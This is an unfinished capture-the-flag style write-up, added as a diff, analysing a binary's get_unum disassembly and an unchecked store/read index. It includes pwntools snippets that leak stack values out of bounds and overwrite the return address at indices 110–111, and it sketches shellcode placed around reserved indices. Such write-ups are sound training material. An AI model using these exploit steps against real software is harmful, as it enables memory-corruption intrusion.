@@ -1,0 +1,136 @@
+Very few hints. Must be the usual shellcode.
+
+#define STORAGE_SIZE 100
+
+The function store_number takes an argument a uint pointer. This function takes input from the user 
+
+value = get_unum(); -> number
+index = get_unum(); -> index
+
+This get_unum function is only shown on the disassembler:
+
+0x4008fd:  push    rbp
+0x4008fe:  mov     rbp, rsp
+0x400901:  sub     rsp, 0x120			-> stack call frame os 0x120 bytes
+0x400908:  mov     rax, qword [fs:0x28]		-> canary
+0x400911:  mov     qword [rbp-0x8], rax		-> canary
+0x400915:  xor     eax, eax			
+0x400917:  mov     rdx, qword [rel stdin]	-> stdin as 3rd argument on a future function call
+0x40091e:  lea     rax, [rbp-0x110]		-> loads buffer in rbp-0x110 onto rax
+0x400925:  mov     esi, 0x100			-> loads 0x100 bytes into esi (2nd argument of a future function call)
+0x40092a:  mov     rdi, rax			-> rax onto rdi
+0x40092d:  call    fgets			-> fgets(buffer, 0x100, stdin)
+0x400932:  test    rax, rax			
+0x400935:  je      0x400966			-> Jumps if eax is 0.
+0x400937:  lea     rdx, [rbp-0x114]		-> Loads a variable starting on rbp-0x114 into rdx (possibly a 4 byte data type)
+0x40093e:  lea     rax, [rbp-0x110]		-> Loads our buffer into rax
+0x400945:  lea     rsi, [rel data_400cf8]	-> %u
+0x40094c:  mov     rdi, rax
+0x40094f:  mov     eax, 0x0
+0x400954:  call    __isoc99_sscanf		-> scanf(buffer, %u, rbp-0x114)
+0x400959:  cmp     eax, 0x1			-> fail check, if not 1 that means it failed!
+0x40095c:  jne     0x400966			-> fail check, if not 1 that means it failed!
+0x40095e:  mov     eax, dword [rbp-0x114]	-> moves buffer into eax, and maybe returns it?
+0x400964:  jmp     0x40096b
+0x400966:  mov     eax, 0x0			-> return 0?
+0x40096b:  mov     rcx, qword [rbp-0x8]		-> ??????????
+0x40096f:  xor     rcx, qword [fs:0x28]
+0x400978:  je      0x40097f
+0x40097a:  call    __stack_chk_fail
+0x40097f:  leave   
+0x400980:  retn
+
+Translated to C with the canary part removed:
+
+int function() {
+    // Stack frame allocation
+    char buffer[256]; // 0x120 bytes
+    unsigned int value;
+
+    // Read input
+    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
+        // Parse input
+        if (sscanf(buffer, "%u", &value) == 1) {
+            return value; // Return the parsed value
+        }
+    }
+    return 0; // Return 0 on failure
+}
+
+%u is for unsigned int.
+
+So far nothing vulnerable (maybe scanf with string modifiers may bug out, but since there is no %s, it should be fine).
+
+All indexes where the remaining of index/3 is equal to 1 are reserved!
+
+if (index % 3 == 1) --> reserved
+
+Looks like it's trying to block our future shellcode!
+
+Finally we save the data(pointer to an unsigned int) on an index of our choice:
+data[index] = value;
+
+The read number function so far looks similar to the above. Might be usefull to check our shellcode.
+
+Time for our main!
+
+We have a result variable which may hold the result if a function is sucessfull running or not.
+
+We have a cmd which is used as the input variable to run commands on the binary.
+
+Finally we have our data with size 100 initialized as 0. The unsigned int * data as the argument on the functions I described above points to the first element of this new data buffer.
+
+So far no problems with the following:
+
+printf("Input command: ");
+fgets(cmd, sizeof(cmd), stdin);
+cmd[strcspn(cmd, "\n")] = 0;
+
+I will analyze the rest of the code after, let's do some testing:
+
+read_number:
+	-> Negative number crashes it.
+	-> Remember it reads up to 256 bytes
+	-> >247 and above the program crashes
+	-> Can read anywhere!!
+store_number:
+	-> Reads again until 256 bytes
+	-> If you input negative numbers it will oveflow. For example: -1 -> 4.294.967.295 (biggest unsigned integer), -2 -> 4294967294
+	-> Can't store on negative index
+	-> No checks on where I can write my data! No "if" index is <100
+
+Possible plan:
+
+Read data until we find a possible RIP while bruteforcing the data to be read, then find where our usual payload is being sent, change the RIP to that and add our shellcode avoiding restrictions.
+
+i = 100 #End of our buffer
+while(i<150):   #Used to find the offset
+    p.sendlineafter(b'Input command: ', b"read")
+    p.sendlineafter(b' Index: ', str(i).encode())
+    garbage = p.readuntil(" is ")
+    address = int(p.read().strip())
+    print(f"Address found on offset {i}: {hex(address)}")
+    i = i + 1
+
+After some testing it seems that the payload is late by 2. Therefore the return address is in 108 but only works on 110.
+
+Time to test if we control the RIP:
+
+#Offset for RIP is 110
+#Our buffer is stored at 0x7fffffffec20 or rbp-0x1b0
+p.sendlineafter(b'Input command: ', b"store")
+p.sendlineafter(b' Number: ', str(int(0xffffec20)).encode())
+p.sendlineafter(b' Index: ', b'110')
+
+p.sendlineafter(b'Input command: ', b"store")
+p.sendlineafter(b' Number: ', str(int(0x00007fff)).encode())
+p.sendlineafter(b' Index: ', b'111')
+
+And we do! We have to split the address because the max unsigned integer is much small than a 64 bit address!
+
+Time to avoid the shellcode restrictions. Let's print a list of numbers to see how long I can have my payload before it's interrupted:
+
+reserved_indices = [i for i in range(200) if i % 3 == 1]
+print(reserved_indices)
+
+
